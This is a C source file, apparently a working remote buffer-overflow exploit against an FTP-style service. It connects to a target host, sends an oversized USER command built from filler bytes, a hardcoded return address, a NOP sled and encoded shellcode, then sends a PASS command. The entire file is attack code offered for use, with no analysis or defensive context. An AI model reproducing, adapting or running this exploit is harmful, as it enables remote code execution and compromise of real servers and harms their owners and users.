#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
char shellcode[] = "\xdb\xc1\xd9\x74\x24\xf4\xb8\x8a\xe7\x2d\xcc\x5b\x33\xc9\xb1"
"\x47\x83\xeb\xfc\x31\x43\x14\x03\x43\x9e\x05\xd8\x30\x76\x4b"
"\x23\xc9\x86\x2c\xad\x2c\xb7\x6c\xc9\x25\xe7\x5c\x99\x68\x0b"
"\x16\xcf\x98\x98\x5a\xd8\xaf\x29\xd0\x3e\x81\xaa\x49\x02\x80"
"\x28\x90\x57\x62\x11\x5b\xaa\x63\x56\x86\x47\x31\x0f\xcc\xfa"
"\xa6\x24\x98\xc6\x4d\x76\x0c\x4f\xb1\xce\x2f\x7e\x64\x45\x76"
"\xa0\x86\x8a\x02\xe9\x90\xcf\x2f\xa3\x2b\x3b\xdb\x32\xfa\x72"
"\x24\x98\xc3\xbb\xd7\xe0\x04\x7b\x08\x97\x7c\x78\xb5\xa0\xba"
"\x03\x61\x24\x59\xa3\xe2\x9e\x85\x52\x26\x78\x4d\x58\x83\x0e"
"\x09\x7c\x12\xc2\x21\x78\x9f\xe5\xe5\x09\xdb\xc1\x21\x52\xbf"
"\x68\x73\x3e\x6e\x94\x63\xe1\xcf\x30\xef\x0f\x1b\x49\xb2\x47"
"\xe8\x60\x4d\x97\x66\xf2\x3e\xa5\x29\xa8\xa8\x85\xa2\x76\x2e"
"\xea\x98\xcf\xa0\x15\x23\x30\xe8\xd1\x77\x60\x82\xf0\xf7\xeb"
"\x52\xfd\x2d\xbb\x02\x51\x9e\x7c\xf3\x11\x4e\x15\x19\x9e\xb1"
"\x05\x22\x75\xda\xac\xd8\x1d\xef\x15\xef\xc6\x87\x57\xef\xe9"
"\x0b\xd1\x09\x63\xa4\xb7\x82\x1b\x5d\x92\x59\xba\xa2\x08\x24"
"\xfc\x29\xbf\xd8\xb2\xd9\xca\xca\x22\x2a\x81\xb1\xe4\x35\x3f"
"\xdf\x08\xa0\xc4\x76\x5f\x5c\xc7\xaf\x97\xc3\x38\x9a\xac\xca"
"\xac\x65\xda\x32\x21\x66\x1a\x65\x2b\x66\x72\xd1\x0f\x35\x67"
"\x1e\x9a\x29\x34\x8b\x25\x18\xe9\x1c\x4e\xa6\xd4\x6b\xd1\x59"
"\x33\x6a\x2d\x8c\x7d\x18\x5f\x0c";

buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 793; i++)

buffer[i] = '\x90';

for (i = 0; i < 308; i++)

buffer[i+793] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
